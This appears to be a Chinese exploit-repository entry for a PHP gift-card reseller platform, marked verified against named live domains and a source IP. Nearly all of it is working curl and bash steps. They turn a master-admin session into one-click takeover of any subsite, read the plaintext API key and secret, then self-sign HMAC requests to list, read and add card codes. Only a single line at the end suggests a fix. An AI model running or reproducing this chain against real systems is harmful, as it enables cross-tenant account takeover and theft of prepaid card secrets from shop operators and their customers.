# 卡商总控后台 /admin/shops.php?act=login_shop 一键免密接管任一分站 → 后台明文读 API Secret → HMAC 自签长期拉卡密

- **code**: cardshop-admin-shops-login_shop-ticket-subsite-takeover-api
- **kind**: exp
- **category**: auth-bypass
- **component**: 自研 PHP 云卡寄售商城（总控 admin/shops.php + 分站 login.php ticket + 单入口 Api.php）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1286，2026-11-06 09:3x 本机 curl.exe --noproxy '*' --tlsv1.2 --resolve 直连源站 103.231.58.20 实测：持 cloud.sktime.cn 管理员 PHPSESSID，GET /admin/shops.php → 200/23040B 并取得 _csrf；POST 同页 _csrf&act=login_shop&id=11 → 200/131B 返回 window.open('http://store.sktime.cn/login.php?ticket=<32hex>')；GET 该 ticket → 302 Location:/user/index.php 且 Set-Cookie 分站 PHPSESSID；带新会话 GET /user/shop.php → 200 明文 apiKey/apiSecret；对 id=18(sho.sho6.cn) 同法再取一套。用 hash_hmac('sha256', app_key+timestamp+nonce, api_secret) 自签 GET /Api.php?action=list → 200 {"code":0,"msg":"商品列表","data":[]}，而假 app_key 返回 33B「app_key 无效」，证明签名校验通过、链路成立（分站当时无卡池故 data 为空）。
- **path**: pocs/cardshop-admin-shops-login_shop-ticket-subsite-takeover-api/cardshop_subsite_takeover.sh
- **tags**: cardshop, 卡商, 礼品卡, 卡密, 分站, 总控后台, login_shop, ticket, 免密登录, 会话接管, auth-bypass, api-secret, hmac-sha256, 自签, 越权
- **created_at**: 2026-11-06T01:52:39.216Z
- **engine**: https://cloud.sktime.cn（分站 store.sktime.cn / sho.sho6.cn）

## 描述

自研卡商系统的总控后台提供"一键登录分站"：持主控管理员会话向 /admin/shops.php 提交 act=login_shop&id=N 即拿到该分站的一次性 32 位 hex 票据，GET 分站 /login.php?ticket= 后 302 进入分站用户后台并下发分站 PHPSESSID，等于跨租户接管任一店铺后台。分站后台 /user/shop.php 明文回显 API Key/API Secret，配合 /Api.php 的 hash_hmac('sha256', app_key.timestamp.nonce, api_secret) 可永久脱离登录态调用 list/detail/add_cards，直接取商品与卡密。核心问题是 login_shop 只校验主控管理员身份、不校验与目标分站的归属关系。

## 用法

```
前置：① 已有主控后台管理员会话（PHPSESSID）；② 分站未删除且域名能路由到源站（DNS 已迁/证书不匹配时用 --resolve 钉源站 IP，并强制 TLS1.2，Windows schannel 走 TLS1.3 会 curl(35)）。不要走本机 HTTP 代理，统一 --noproxy '*'。

第 1 步 取 CSRF 与分站 id 清单：
  curl -sS -k --noproxy '*' --tlsv1.2 --tlsmax 1.2 --resolve cloud.sktime.cn:443:SOURCE_IP \
    -H "Cookie: PHPSESSID=ADMIN_SESS" https://cloud.sktime.cn/admin/shops.php -o shops.html
  grep -oE 'loginShop\([0-9]+\)' shops.html        # 得到全部可分站 id
  CSRF=$(grep -oE 'name="_csrf" value="[0-9a-f]+"' shops.html | grep -oE '[0-9a-f]{16,}')
判据：200 且 HTML 含 loginShop(...) 与隐藏表单 loginShopForm。

第 2 步 为指定 id 签票：
  curl -sS -k --noproxy '*' --tlsv1.2 --tlsmax 1.2 --resolve cloud.sktime.cn:443:SOURCE_IP \
    -H "Cookie: PHPSESSID=ADMIN_SESS" -H "Content-Type: application/x-www-form-urlencoded" \
    --data "_csrf=$CSRF&act=login_shop&id=11" https://cloud.sktime.cn/admin/shops.php
判据：200 且 body 形如 <script>window.open('http://TARGET_SHOP/login.php?ticket=<32hex>',...)</script>。

第 3 步 用票登入（票据一次性，抓 302 与 Set-Cookie，别 -L 到浏览器页）：
  curl -sS -k --noproxy '*' -i --resolve TARGET_SHOP:443:SOURCE_IP \
    "http://TARGET_SHOP/login.php?ticket=$TICKET"
判据：302 + Location: http://TARGET_SHOP/user/index.php + Set-Cookie: PHPSESSID=SHOP_SESS。只看 200 不算成功。

第 4 步 读明文凭据：
  curl -sS -k --noproxy '*' -b "PHPSESSID=SHOP_SESS" https://TARGET_SHOP/user/shop.php
  取 <code id="apiKey"> 与 <code id="apiSecret">。

第 5 步 自签调 API（签名串 app_key→timestamp→nonce 直连、无分隔符，HMAC key 是 api_secret，timestamp 秒级且 ±300s 内、nonce 每次随机）：
  ts=$(date +%s); nonce=$(head -c8 /dev/urandom | xxd -p)
  sign=$(printf '%s%s%s' "$APP_KEY" "$ts" "$nonce" | openssl dgst -sha256 -hmac "$API_SECRET" -r | cut -d' ' -f1)
  curl -sS -k --noproxy '*' --resolve TARGET_SHOP:443:SOURCE_IP \
    "https://TARGET_SHOP/Api.php?action=list&app_key=$APP_KEY&timestamp=$ts&nonce=$nonce&sign=$sign"
判据：{"code":0,...} 为通过；假 app_key 对照应回「app_key 无效」。action 换 detail/add_cards 取卡密与补卡。

失败常见原因：主控会话过期（先复访 /admin/shops.php 确认是 200 而非跳登录）；分站域名解析不到或 TLS 握手失败（改用 --resolve+--tlsv1.2）；票据被用过一次（每 id 重新签）；签名字符串顺序/分隔符错、timestamp 超窗、nonce 复用；分站已过期或被删（过期站仍可登录但可能无数据）。

局限：分站若无上架商品/卡池，list 只在无卡池时有意义为空，需转 /user/shop_products.php 或总控 /admin/cards.php?pid=N 确认；本系统（PHP 卡商栈）与独立 Node 站不同源，勿混用。
```

## 正文

```
# 卡商总控后台 act=login_shop 免密接管任一分站 → 明文 API Secret → 自签拉卡密

## 结论
总控后台 `/admin/shops.php` 的“一键登录分站”功能只校验“请求者是主控管理员”，**不校验该管理员与目标分站是否存在归属关系**。任意管理员一枚 POST 即可为任意 `id` 的分站签出一次性 32 位 hex 登录票据，跟随 302 即获得该分站的用户后台会话（跨租户接管）。

拿到分站会话后，`/user/shop.php` 明文展示 API Key / API Secret；再用 `/Api.php` 的公开签名规则自签，即可**永久脱离登录态**读取该分站商品与卡密、甚至 `add_cards` 补卡。

本条目只覆盖“如何拿到 app_key/api_secret”；API 契约本身（action 全表、±300s 时间窗）见同组件条目 `selfhosted-cardshop-api-php-action-help-contract-unauth`。

## 前置条件
1. 有效的总控后台管理员会话（`PHPSESSID`）。来源可以是弱口令、找回口令、任一会话窃取。
2. 目标分站未删除；其域名能路由回同一源站。源站 IP 已知时一律
   `--resolve TARGET:443:SOURCE_IP`，并 `--tlsv1.2 --tlsmax 1.2`（Windows schannel 默认 TLS1.3 在过期/多 IP 域名上会 curl(35) 握手失败）。
3. 全程 `--noproxy '*'`，避免本地 HTTP 代理污染结论。

## 复现步骤

### 1. 枚举分站 id 并取 CSRF
```bash
curl -sS -k --noproxy '*' --tlsv1.2 --tlsmax 1.2 \
  --resolve cloud.example.com:443:SOURCE_IP \
  -H "Cookie: PHPSESSID=<ADMIN_SESS>" \
  https://cloud.example.com/admin/shops.php -o shops.html

grep -oE 'loginShop\([0-9]+\)' shops.html      # 全部可分站 id
CSRF=$(grep -oE 'name="_csrf" value="[0-9a-f]+"' shops.html | grep -oE '[0-9a-f]{16,}')
```
期望：`200`，页面含 `loginShop(N)` 与隐藏表单 `loginShopForm(_csrf, act=login_shop, id)`。

### 2. 为指定 id 签票
```bash
curl -sS -k --noproxy '*' --tlsv1.2 --tlsmax 1.2 \
  --resolve cloud.example.com:443:SOURCE_IP \
  -H "Cookie: PHPSESSID=<ADMIN_SESS>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "_csrf=$CSRF&act=login_shop&id=11" \
  https://cloud.example.com/admin/shops.php
```
期望（票据 32hex，一次性）：
```html
<script>window.open('http://shop.example.com/login.php?ticket=0bcb...cd0c1', '_blank'); history.back();</script>
```

### 3. 跟票登入分站（不要 -L，直接看 302 与 Set-Cookie）
```bash
curl -sS -k --noproxy '*' -i --resolve shop.example.com:443:SOURCE_IP \
  "http://shop.example.com/login.php?ticket=<TICKET>"
```
成功判据（两条同时出现）：
```
HTTP/1.1 302 Found
Location: http://shop.example.com/user/index.php
Set-Cookie: PHPSESSID=<SHOP_SESS>
```
> 只回 200 不代表成功；票据一次性，过期/重复用会回登录页。

### 4. 读明文 API 凭据
```bash
curl -sS -k --noproxy '*' -b "PHPSESSID=<SHOP_SESS>" \
  https://shop.example.com/user/shop.php
```
页面含：
```html
<code id="apiKey">k_<32hex></code>
<code id="apiSecret"><40hex></code>
```

### 5. 自签调用开放 API（证明可脱离登录态长期使用）
签名串 = `app_key` + `timestamp` + `nonce` **直接相连、无分隔符**；HMAC-SHA256 的 key 是 `api_secret`；`timestamp` 为秒级 Unix 时间戳且误差 ±300s 内；`nonce` 每次随机。
```bash
APP_KEY='k_<32hex>'; API_SECRET='<40hex>'
ts=$(date +%s); nonce=$(head -c8 /dev/urandom | xxd -p)
sign=$(printf '%s%s%s' "$APP_KEY" "$ts" "$nonce" \
       | openssl dgst -sha256 -hmac "$API_SECRET" -r | cut -d' ' -f1)

curl -sS -k --noproxy '*' --resolve shop.example.com:443:SOURCE_IP \
  "https://shop.example.com/Api.php?action=list&app_key=$APP_KEY&timestamp=$ts&nonce=$nonce&sign=$sign"
```
判据：`{"code":0,"msg":"商品列表","data":[...]}`。对照组用假 app_key 应回 `{"code":1,"msg":"app_key 无效"}`（约 30B）。
`action` 换 `detail`（带商品 id）取具体卡密，`add_cards` 可补卡。

## 失败常见原因
- 主控会话已过期：先无副作用复访 `/admin/shops.php`，是 200 才算有效；302 到登录页则重登。
- 分站域名 DNS 已迁/证书不匹配：必须 `--resolve` 钉原源站 IP 并降 TLS 到 1.2。
- 票据重复使用：每个 id、每次都要重新签票。
- 签名串顺序写错或加了分隔符；`timestamp` 用了毫秒或超 300s；`nonce` 复用。
- 分站状态为“已过期/已删除”：过期站可能还能登录但后台无数据；删除站直接 302 回登录。
- 走了本地代理导致全链路假阴性。

## 影响面与局限
- 影响：一个主控管理员会话 → 全部分站后台 + 每站永久 API 凭据；`list/detail` 直取卡密，`add_cards` 可写入，`on/off` 影响商品上下架。
- 分站可能本身无商品/卡池，此时 `list` 返回 `data:[]` 属正常，需再查 `/user/shop_products.php` 或总控 `/admin/cards.php?pid=N` 确认，别误判为签名失败。
- 该栈为 PHP 卡商系统，与独立 Node 站（如 ecloudstore.com）不同源，链路不可直接平移。

## 最小化修复建议
`login_shop` 校验分站归属；票据限时（≤60s）且绑定一次性 nonce；`/user/shop.php` 的 api_secret 默认打码、点击再显示。

```
